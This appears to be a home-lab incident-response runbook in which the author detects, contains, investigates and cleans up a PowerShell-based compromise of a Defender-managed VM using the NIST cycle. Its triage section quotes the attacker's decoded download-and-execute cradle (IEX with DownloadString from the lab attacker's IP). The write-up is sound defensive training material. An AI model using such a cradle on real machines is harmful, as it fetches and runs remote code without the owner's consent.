# Incident Response Runbook

This is the full incident response I ran on the compromised machine, victim-a, after my custom rules made the multi-stage incident. I followed the **NIST SP 800-61** framework. The eradication step also lines up with the SANS PICERL model.

## Frameworks I used

- **NIST SP 800-61** (main) — the response cycle: Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity. This project works the Detection & Analysis and Containment, Eradication & Recovery phases in depth.
- **SANS PICERL** (noted) — Preparation, Identification, Containment, Eradication, Recovery, Lessons learned. Same cycle, with Eradication called out as its own step, which maps to the eradication work below.
- **MITRE ATT&CK** — used to label the attacker's techniques in the [attack chain](../attack-chain/), not as a response framework. Keeping these apart matters: ATT&CK describes what the *attacker* does; NIST and PICERL describe what the *responder* does.

---

## The cycle at a glance

```
DETECT      4 custom rules fired; multi-stage incident built itself
TRIAGE      Worked the incident, decoded the cradle, called it a True Positive
CONTAIN     Isolated victim-a from the Defender portal
INVESTIGATE Live Response shell on victim-a; proved the payload was never on disk
ERADICATE   Removed the Run key, disabled labvictim + labtest, blocked the attacker IP; re-ran it through Live Response
VERIFY      Confirmed the Run key was gone (locally and through Live Response)
RECOVER     Released victim-a from isolation
```

---

## Detect

My four custom rules (see [detections/custom-detection-rules.md](../detections/custom-detection-rules.md)) made alerts that Defender grouped into incidents:

- **Incident 2** — "Multi-stage incident involving Execution & Persistence on one endpoint" (Medium, 2/2 alerts, Custom detection, victim-a). The big one.
- **Incident 3** — "RDP Lateral Movement Detected on victim-b" (Medium, Custom detection, victim-b).
- **Incident 1** — "EICAR_Test_File malware was prevented" (Informational, Antivirus, victim-a). The built-in catch, for contrast.

The EICAR contrast is worth a note. A signature-based antivirus engine *did* catch the EICAR test file and block it on its own. But the behavioral attack went undetected by default. Signatures caught a known-bad string. Behavioral detection missed a credential-based, LOLBin attack. That contrast is the whole point in one example.

## Triage

I opened the multi-stage incident and the Encoded PowerShell alert, then read the process tree: `userinit.exe → explorer.exe → powershell.exe → "powershell.exe executed a script"`.

- Confirmed the binary was the real signed Microsoft `powershell.exe` (VirusTotal 0/70) — LOLBin abuse, not malware.
- Pulled the exact command line with KQL and decoded the base64 to confirm the `IEX ... DownloadString('http://192.168.74.136/payload.ps1')` cradle.
- **Verdict: True Positive.**

## Contain

I isolated victim-a from the Defender portal (Device page → "..." → Isolate device → Full isolation), with a comment noting the active compromise. The Action Center confirmed the isolation was applied.

![Action Center showing the isolate device action](../screenshots/20-action-center-ir-history.png)
*The Action Center History logs the whole response. The "Isolate device" entry on victim-a (source: Portal, status: Completed) is the containment step.*

The isolation also shows right in the incident graph, where victim-a says **Isolated** in red:

![Multi-stage incident showing victim-a isolated](../screenshots/19-multistage-attack-story.png)
*Containment in the graph: victim-a marked Isolated inside the incident.*

A note on isolated machines: once a machine is isolated it's off the network for normal access, so I reached its console straight through the VMware window for local commands. Live Response still works through the Defender channel even while the machine is isolated, because that channel is the EDR's own path, not regular network access.

## Investigate and eradicate

### Investigate (Live Response)

I turned on Live Response in Settings → Endpoints → Advanced features (Live Response, Live Response for Servers, and unsigned script execution), waited a few minutes for it to kick in, then opened a Live Response session on victim-a.

In the shell I checked if the payload was actually on disk:

```
dir "C:\Users\Public"
```

The folder did **not** have `beacon.ps1`. Trying to remove the file confirmed it:

```
remediate file "C:\Users\Public\beacon.ps1"   →  Failed (file not found)
```

That's proof the payload file was never dropped. The **Run key itself was the real foothold**, not a file. The Action Center logs both the `dir` command (Completed) and the `remediate file` try (Failed), which together make the point.

### Eradicate

I removed the foothold two ways — first locally, then again through Live Response to show it the EDR way.

**Locally on victim-a** (through the VMware console, since the machine was isolated), in an admin PowerShell:

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater"
net user labvictim /active:no            # disable the cracked account
New-NetFirewallRule -DisplayName "Block Attacker Kali" -Direction Inbound -RemoteAddress 192.168.74.136 -Action Block
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater"
# → "Property Updater does not exist"  == cleanup confirmed
```

**On victim-b** (the jump target):

```powershell
net user labtest /active:no              # disable the lateral-movement account
```

**Again through Live Response** (the EDR way): I made `eradicate.ps1`, uploaded it to the Live Response library (console "..." → Upload file to library), checked it with `library`, then ran `run eradicate.ps1` on victim-a.

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -ErrorAction SilentlyContinue
net user labvictim /active:no
New-NetFirewallRule -DisplayName "Block Attacker Kali LR" -Direction Inbound -RemoteAddress 192.168.74.136 -Action Block -ErrorAction SilentlyContinue
Write-Output "=== VERIFY: Run key should be gone (no output = removed) ==="
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -ErrorAction SilentlyContinue
Write-Output "=== Eradication complete via Live Response ==="
```

![Live Response running eradicate.ps1](../screenshots/17-liveresponse-eradicate.png)
*Live Response on victim-a running eradicate.ps1: the firewall block rule (Block Attacker Kali LR, Enabled: True, Action: Block) is made, the verify banner shows no Run-key output, and the last banner confirms the cleanup through the EDR.*

The cleanup steps in one place:

| Action | Target | Result |
|--------|--------|--------|
| Remove Run key `Updater` | victim-a (HKCU) | Removed |
| Disable account `labvictim` | victim-a | "The command completed successfully" |
| Disable account `labtest` | victim-b | "The command completed successfully" |
| Block attacker IP 192.168.74.136 | victim-a firewall | Inbound block rule made |
| Re-run cleanup via Live Response | victim-a | Done through the EDR |

## Verify

I confirmed the Run key was gone two ways:

- **Locally:** `Get-ItemProperty` returned "Property Updater does not exist".
- **Through Live Response:** the `eradicate.ps1` verify banner showed no Run-key output, confirming it through the EDR.

## Recover

I released victim-a from isolation (Device page → "..." → Release from isolation), with a comment noting the cleanup was confirmed. That closes the cycle and puts the machine back to normal.

---

## Tier 1 vs Tier 2

Worth noting for a SOC. Detection, triage, and the verdict (True Positive) are Tier 1 work. Containment by portal isolation is usually Tier 1 or a Tier 1/Tier 2 handoff. Hands-on Live Response cleanup and cross-host work lean toward Tier 2 / incident handler. Running the whole cycle end to end in the lab shows the full pipeline, while being clear about where the tier lines usually sit in a staffed SOC.
